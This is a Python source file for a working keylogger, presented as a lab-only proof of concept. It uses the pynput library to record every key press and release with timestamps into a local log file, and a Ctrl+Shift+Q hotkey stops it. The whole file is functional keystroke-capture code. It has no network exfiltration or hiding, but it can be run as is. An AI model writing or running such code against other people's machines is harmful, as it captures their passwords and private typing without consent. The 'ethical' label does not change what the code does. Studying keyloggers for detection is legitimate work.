#!/usr/bin/env python3
"""
keylogger_poc.py -- Ethical Proof-of-Concept for defensive study
- Logs keystrokes to a local file in the current directory.
- Includes a safe hotkey (Ctrl+Shift+Q) to stop the logger gracefully.
- MEANT FOR LAB USE ONLY on machines you own.
"""

import os
import sys
from datetime import datetime
from pynput import keyboard
from threading import Event

LOGFILE = os.path.join("results", "keylog_lab.txt")
STOP_HOTKEY = {keyboard.Key.ctrl_l, keyboard.Key.shift, keyboard.KeyCode.from_char('q')}  # ctrl + shift + q

os.makedirs("results", exist_ok=True)

class KeyLogger:
    def __init__(self, logfile=LOGFILE):
        self.logfile = logfile
        self.current_keys = set()
        self.stop_event = Event()

    def on_press(self, key):
        # track combo for stop
        try:
            self.current_keys.add(key)
        except Exception:
            pass

        # write key to file
        now = datetime.utcnow().isoformat()
        with open(self.logfile, "a", encoding="utf-8") as f:
            f.write(f"{now}\tPRESS\t{repr(key)}\n")

        # check for stop hotkey: ctrl + shift + q
        if keyboard.Key.ctrl_l in self.current_keys and keyboard.Key.shift in self.current_keys:
            # detect char 'q'
            for k in self.current_keys:
                if isinstance(k, keyboard.KeyCode) and k.char == 'q':
                    print("[*] Stop hotkey detected. Exiting.")
                    self.stop_event.set()

    def on_release(self, key):
        try:
            if key in self.current_keys:
                self.current_keys.remove(key)
        except KeyError:
            pass
        with open(self.logfile, "a", encoding="utf-8") as f:
            now = datetime.utcnow().isoformat()
            f.write(f"{now}\tRELEASE\t{repr(key)}\n")

    def run(self):
        print("[*] Keylogger started. Press Ctrl+Shift+Q to stop (lab-only).")
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            # wait until stop_event is set
            while not self.stop_event.is_set():
                try:
                    self.stop_event.wait(0.5)
                except KeyboardInterrupt:
                    self.stop_event.set()
            listener.stop()
        print(f"[*] Stopped. Log saved to {self.logfile}")

if __name__ == "__main__":
    kl = KeyLogger()
    try:
        kl.run()
    except Exception as e:
        print("Error:", e)
        sys.exit(1)
